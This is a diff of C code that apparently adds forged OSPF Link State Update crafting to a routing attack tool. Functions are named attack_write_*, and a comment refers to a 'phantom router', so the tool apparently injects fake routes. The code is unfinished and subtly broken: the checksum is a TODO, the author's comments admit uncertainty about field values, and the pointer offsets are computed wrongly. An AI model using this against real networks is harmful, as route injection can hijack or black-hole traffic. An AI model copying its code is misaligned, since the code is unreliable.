@@ -21,6 +21,7 @@
 int ospf_write_header(unsigned char *buffer, char *local_ip, int ospf_len, unsigned char packet_type);
 int ospf_write_hello(unsigned char *buffer, char *router_ip);
 int ospf_write_db_description(unsigned char* buffer, unsigned long sequence_number, __u8 control);
+int ospf_write_ls_update(unsigned char *buffer, char *local_ip);
 int ospf_write_lss_data_block(unsigned char *buffer);
 
 // Writes an OSPF Hello Packet on the buffer and returns the total amount of
@@ -63,6 +64,26 @@ int attack_write_db_description(unsigned char buffer[BUFFER_LEN], unsigned char 
   ospf_len += ospf_write_db_description(ospf_buffer_ptr + sizeof(struct ospf_header), 1000, control);
   ospf_len += ospf_write_header(ospf_buffer_ptr, local_ip, sizeof(struct ospf_dd), OSPF_DATADESC_T);
   ospf_len += ospf_write_lss_data_block(ospf_buffer_ptr + ospf_len);
+
+  // IP header
+  int ip_header_len = write_ipv4_header(buffer + ether_header_len, local_ip, router_ip, ospf_len);
+
+  return ether_header_len + ip_header_len + ospf_len;
+}
+
+int attack_write_ls_update(unsigned char buffer[BUFFER_LEN], unsigned char *local_mac, char *local_ip, char *router_ip) {
+  // Ethernet header
+  unsigned char *dest_mac = parse_mac_addr(IPV4_MULTICAST_MAC);
+  int ether_header_len = write_ipv4_ethernet_header(buffer, local_mac, dest_mac);
+
+  // Position on the buffer where we should begin writing OSPF data
+  int ospf_packet_offset = ether_header_len + sizeof(struct ip);
+  unsigned char *ospf_buffer_ptr = buffer + ospf_packet_offset;
+
+  // OSPF sections of the packet
+  int ospf_len = 0;
+  ospf_len += ospf_write_ls_update(ospf_buffer_ptr, local_ip);
+  ospf_len += ospf_write_header(ospf_buffer_ptr, local_ip, ospf_len, OSPF_LSUPDATE_T);
 
   // IP header
   int ip_header_len = write_ipv4_header(buffer + ether_header_len, local_ip, router_ip, ospf_len);
@@ -114,6 +135,35 @@ int ospf_write_db_description(unsigned char* buffer, unsigned long sequence_numb
   database_description_header_ospf->dd_seq = htonl(sequence_number);        /* Sequence Number      */
 
   return sizeof(struct ospf_dd);
+}
+
+int ospf_write_ls_update(unsigned char *buffer, char *local_ip) {
+  int length = 0;
+  // OSPF Link State Update
+  struct ospf_lsu *lsu_header_ospf = (struct ospf_lsu *) buffer;
+  lsu_header_ospf->lsu_nads = inet_addr("0.0.0.1");                         /* # Advertisments This Packet  */
+  length += sizeof(struct ospf_lsu);
+
+  // OSPF link state summary header
+  struct ospf_lss *lss_header_ospf = (struct ospf_lss *) buffer + length;
+  lss_header_ospf->lss_age = LSS_AGE;                                       /* Time (secs) Since Originated ?pedro I can't know if fixed value */
+  lss_header_ospf->lss_opts = LSS_OPTIONS;                                  /* Options Supported */
+  lss_header_ospf->lss_type = LSST_ROUTE;                                   /* LST_* below ?pedro */
+  lss_header_ospf->lss_lsid = inet_addr(local_ip);                          /* Link State Identifier */
+  lss_header_ospf->lss_rid = inet_addr(local_ip);                           /* Advertising Router Identifier ?pedro I think would was THE PHANTOM ROUTER*/
+  lss_header_ospf->lss_seq = LSS_SEQ_NUM;                                   /* Link State Adv. Sequence #   */
+  // TODO: CHECKSUM: lss_header_ospf->lss_cksum;  /* ?pedro Fletcher Checksum of LSA */
+  lss_header_ospf->lss_len = LSS_LENGTH;    /* Length of Advertisement ?pedro I don't know, because in wireshark a header has 3 LSS and values not equal*/
+  length += sizeof(struct ospf_lss);
+
+  // OSPF Network Links Advertisement
+  struct  ospf_na *na_header_ospf = (struct ospf_na *) buffer + length;
+  na_header_ospf->na_mask = inet_addr("255.0.0.0");                         /* Network Mask     */
+  na_header_ospf->na_rid[0] = inet_addr("200.0.0.1");                       /* ID of first  Attached Routers  */
+  na_header_ospf->na_rid[1] = inet_addr("100.0.0.1");                       /* ID of second Attached Routers  */
+  length += sizeof(struct ospf_na);
+
+  return length;
 }
 
 int ospf_write_lss_data_block(unsigned char *buffer) {
